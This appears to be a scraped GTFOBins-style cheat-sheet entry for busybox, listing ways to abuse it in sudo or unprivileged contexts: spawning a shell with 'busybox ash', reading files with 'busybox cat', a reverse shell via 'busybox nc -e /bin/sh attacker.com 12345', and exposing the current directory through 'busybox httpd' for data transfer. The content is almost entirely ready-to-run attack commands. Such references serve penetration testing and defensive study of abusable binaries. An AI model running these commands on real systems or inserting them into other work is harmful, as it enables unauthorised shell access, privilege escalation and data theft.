title: busybox
html:
busybox

Inherit

Context: sudo, unprivileged

busybox ash

Context: sudo, unprivileged

busybox cat

Reverse Shell

Context: sudo, unprivileged

busybox nc -e /bin/sh attacker.com 12345

Upload

Context: sudo, unprivileged

busybox httpd -f -p 12345 -h .
